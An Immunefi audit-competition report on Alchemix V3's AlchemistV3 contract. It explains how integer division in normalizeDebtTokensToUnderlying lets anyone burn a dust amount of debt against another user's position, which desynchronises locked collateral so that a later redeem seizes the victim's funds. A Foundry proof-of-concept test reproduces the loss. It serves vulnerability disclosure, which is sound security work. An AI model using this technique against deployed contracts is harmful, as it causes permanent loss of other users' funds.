# 57053 sc critical integer division precision loss in normalizedebttokenstounderlying leads to permanent collateral locking

**Submitted on Oct 23rd 2025 at 03:42:01 UTC by @fullstop for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57053
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

A critical precision loss vulnerability exists in the AlchemistV3 contract's debt-to-underlying conversion logic. When a user or attacker repays a very small amount of debt (an amount less than the underlyingConversionFactor), the integer division in normalizeDebtTokensToUnderlying rounds the amount of collateral to be "freed" down to zero. This causes a critical state desynchronization: the user's debt is correctly reduced, but their internal rawLocked collateral accounting is not. This desynchronized state acts as a "trap," which is later triggered by a global redeem event. When triggered, the contract's \_sync logic incorrectly seizes a portion of the user's actual collateralBalance to cover global redemptions, leading to a permanent and irrecoverable loss of user funds.

## Vulnerability Details

The vulnerability is exploited in a three-stage process: "The Setup," "The Trap," and "The Kill."

#### Stage 1: The Setup (Prerequisite)

The vulnerability is only present when the debtToken has significantly more decimals than the underlyingToken.

In initialize, the underlyingConversionFactor is set:

```
underlyingConversionFactor = 10 ** (TokenUtils.expectDecimals(params.debtToken) - TokenUtils.expectDecimals(params.underlyingToken));
```

Using the PoC's parameters (18-decimal debtToken, 6-decimal underlyingToken), this factor becomes `10**(18 - 6) = 1e12`.

#### Stage 2: The Trap (State Desynchronization)

The attacker's goal is to desynchronize a victim's debt and rawLocked states. This is achieved by repaying a "dust" amount of debt.

The attacker calls `burn(amountToBurn, victim_tokenId)`, where `amountToBurn < underlyingConversionFactor` (e.g., `1e12 - 1`).

`burn` calls `_subDebt(victim_tokenId, amountToBurn)`.

Inside `_subDebt`, the contract calculates the amount of locked collateral to release (toFree):

```
uint256 toFree = convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
```

`convertDebtTokensToYield` calls `normalizeDebtTokensToUnderlying(amount)`. This is the root cause: The conversion function performs integer division:

```
    function normalizeDebtTokensToUnderlying(uint256 amount) public view returns (uint256) {
        return amount / underlyingConversionFactor;
    }
```

Because amount (`1e12 - 1`) is less than underlyingConversionFactor (1e12), this function returns 0.

As a result, toFree is calculated as 0.

\_subDebt then proceeds to:

Correctly reduce the victim's debt: `account.debt -= amount;`.

Incorrectly fail to reduce the locked collateral: `_totalLocked -= toFree;` (i.e., `_totalLocked -= 0`) and `account.rawLocked = lockedCollateral - toFree;` (i.e., rawLocked is not reduced).

At the end of this stage, the victim's position is in a desynchronized state: their debt is lower, but their rawLocked (their pro-rata stake in the system's risk) is still incorrectly high.

#### Stage 3: Loss (Realizing the Loss)

The desynchronized state is harmless until a global event changes the protocol's accounting.

The Trigger: A `transmuter` calls `alchemist.redeem(earmarked)`. This action is a normal part of the protocol. Crucially, it updates the global `_collateralWeight`.

The Loss: The victim's position is now out of sync with the global state. The next time the victim's account is accessed (e.g., via getCDP, deposit, withdraw, etc.), the \_sync logic is triggered.

\_sync calculates the collateral to remove from the victim's balance to account for the global redeem:

```
uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
```

This is the kill: The formula uses the incorrectly high rawLocked from Stage 2 against the newly updated \_collateralWeight from Stage 3. This results in an erroneously large collateralToRemove value.

This value is then subtracted directly from the victim's actual assets:

```
account.collateralBalance -= collateralToRemove;
```

The Funds Lost shown in the PoC log (5555555555555555555556) is this collateralToRemove. It is not returned to the user; it is seized by the protocol to cover a global redemption for which the user was not proportionally responsible.

## Impact Details

This is a High/Critical vulnerability leading to permanent, irrecoverable loss of user funds.

The attack vector is highly malicious and accessible. Any user holding even a tiny amount of the debtToken can set this "trap" on any other user's position (tokenId) by simply calling burn(dust\_amount, victim\_tokenId). The attacker pays only gas and a negligible amount of debt, but the victim permanently loses a significant portion of their deposited collateral. The victim cannot prevent this attack, and the loss is realized silently the next time the protocol syncs their account.

## References

Vulnerable Contract: AlchemistV3.sol

Root Cause (Precision Loss): normalizeDebtTokensToUnderlying

Trap Location (State Desync): \_subDebt

Loss Realization (Fund Seizure): \_sync

## Proof of Concept

## Proof of Concept

The following Foundry test case successfully reproduces the vulnerability, resulting in a permanent loss of 5.55e21 myt tokens from the victim's 1e23 collateralBalance.

Add `testVulnerability_Repay_PrecisionLoss_LocksCollateral_FullTrigger` in `src/test/AlchemistV3_6_decimals.t.sol`.

```
function testVulnerability_Repay_PrecisionLoss_LocksCollateral_FullTrigger() external {
        // 1. ARRANGE: Ensure we are in a 6-decimal underlying token environment
        require(TokenUtils.expectDecimals(alchemist.underlyingToken()) == 6, "Test setup failed: Underlying token is not 6 decimals");
        require(TokenUtils.expectDecimals(alchemist.debtToken()) == 18, "Test setup failed: Debt token is not 18 decimals");

        // Participants:
        address userA_victim = yetAnotherExternalUser; // The victim whose funds will be locked
        address userB_burner = anotherExternalUser;    // The burner who sets the trap
        address userC_global = address(0xbeef);      // Another user to ensure global state is redeemable

        // 2. ARRANGE: Set up the scenario
        // User A (Victim) deposits and mints
        vm.startPrank(userA_victim);
        uint256 depositAmountA = 100_000e18; // 100,000 MYT
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmountA);
        alchemist.deposit(depositAmountA, userA_victim, 0); // tokenId 1
        uint256 tokenId_A = AlchemistNFTHelper.getFirstTokenId(userA_victim, address(alchemistNFT));
        uint256 debtToMintA = 50_000e18; // 50,000 alToken
        alchemist.mint(tokenId_A, debtToMintA, userB_burner); // Send the debtToken to User B
        vm.stopPrank();

        // User C (Global participant) deposits, mints, and *repays* to fund the Transmuter
        vm.startPrank(userC_global);
        uint256 depositAmountC = 100_000e18; // 100,000 MYT
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmountC);
        alchemist.deposit(depositAmountC, userC_global, 0); // tokenId 2
        uint256 tokenId_C = AlchemistNFTHelper.getFirstTokenId(userC_global, address(alchemistNFT));
        uint256 debtToMintC = 50_000e18; // 50,000 alToken
        alchemist.mint(tokenId_C, debtToMintC, userC_global);
        
        uint256 repayAmountC = 10_000e18; // 10,000 MYT
        SafeERC20.safeApprove(address(vault), address(alchemist), repayAmountC);
        
        // We must advance one block to avoid the `CannotRepayOnMintBlock` check on `repay`
        vm.roll(block.number + 1);
        
        alchemist.repay(repayAmountC, tokenId_C);
        vm.stopPrank();

        // [FIX]: 
        // 2.5 ARRANGE: 
        // The `repay` call sent 1e22 (repayAmountC) of MYT to the transmuter.
        // We must simulate the transmuter calling setTransmuterTokenBalance
        // to update Alchemist's `lastTransmuterTokenBalance` accounting.
        // Otherwise, this 1e22 MYT will be counted as "cover" during `_earmark`
        // and offset our simulated yield.
        vm.startPrank(address(transmuterLogic));
        alchemist.setTransmuterTokenBalance(repayAmountC);
        vm.stopPrank();

        // 3. ARRANGE: Calculate the `amountToBurn` needed to trigger the vulnerability
        uint256 conversionFactor = 10**(TokenUtils.expectDecimals(alchemist.debtToken()) - TokenUtils.expectDecimals(alchemist.underlyingToken()));
        uint256 amountToBurn = conversionFactor - 1; // Key: amount is less than the conversion factor

        // 4. ARRANGE: Warp time forward significantly
        vm.roll(block.number + 5_256_000 / 2); // Warp forward half a year

        // 4.5 ARRANGE: Simulate Transmuter yield generation
        // Explanation: This is a valid prerequisite for testing the AlchemistV3 vulnerability.
        uint256 simulatedYieldInDebt = 10_000e18; // Simulate 10,000 alToken of yield

        // Mock *any* call to the `queryGraph(uint256,uint256)` function
        vm.mockCall(
            address(transmuterLogic),
            abi.encodeWithSelector(ITransmuter.queryGraph.selector, 0, 0), // Match any arguments
            abi.encode(simulatedYieldInDebt) // The mocked return value
        );
        // Clear previous mocks, just keep this one
        vm.clearMockedCalls(); 
        vm.mockCall(
            address(transmuterLogic),
            abi.encodeWithSelector(ITransmuter.queryGraph.selector), // Match selector with no args (just in case)
            abi.encode(simulatedYieldInDebt)
        );
        // **The most critical mock rule**:
        // AlchemistV3 calls `queryGraph` with arguments
        vm.mockCall(
            address(transmuterLogic),
            abi.encodeWithSelector(
                ITransmuter.queryGraph.selector,
                block.number, // lastEarmarkBlock + 1
                block.number + 1  // block.number (inside burn)
            ),
            abi.encode(simulatedYieldInDebt)
        );
        // **Wildcard mock (most reliable)**
        vm.mockCall(
            address(transmuterLogic),
            bytes4(keccak256("queryGraph(uint256,uint256)")),
            abi.encode(simulatedYieldInDebt)
        );

        // 5. ACT: (Set the trap) User B burns a tiny amount of debt
        vm.startPrank(userB_burner);
        TokenUtils.safeApprove(alchemist.debtToken(), address(alchemist), amountToBurn);
        alchemist.burn(amountToBurn, tokenId_A); // This will call _earmark
        vm.stopPrank();

        // 6. ASSERT: (Verify the trap is set)
        (uint256 collateralBefore, uint256 debtAfterBurn,) = alchemist.getCDP(tokenId_A);
        assertEq(debtAfterBurn, debtToMintA - amountToBurn, "Debt was not reduced correctly after burn");
        
        // 7. ARRANGE: (Trigger global event) Transmuter executes redeem
        uint256 earmarked = alchemist.cumulativeEarmarked();
        
        // Assert Earmark was successful
        assertTrue(earmarked > 0, "Earmark failed, no funds to redeem. Transmuter did not generate yield.");

        vm.startPrank(address(transmuterLogic));
        alchemist.redeem(earmarked);
        vm.stopPrank();
        
        // 8. ACT & ASSERT: (Spring the trap)
        (uint256 collateralAfter, , ) = alchemist.getCDP(tokenId_A);

        // **Core Assertion: Funds have been permanently locked/stolen**
        assertTrue(collateralAfter < collateralBefore, "VULNERABILITY NOT TRIGGERED: Collateral balance was not reduced.");
        
        console.log("--- Vulnerability Reproduced (Permanent Loss) ---");
        console.log("Collateral Before Trap: %s", collateralBefore);
        console.log("Collateral After Trap:  %s", collateralAfter);
        console.log("Funds Lost:             %s", collateralBefore - collateralAfter);
        console.log("--------------------------------------------------");
    }
```
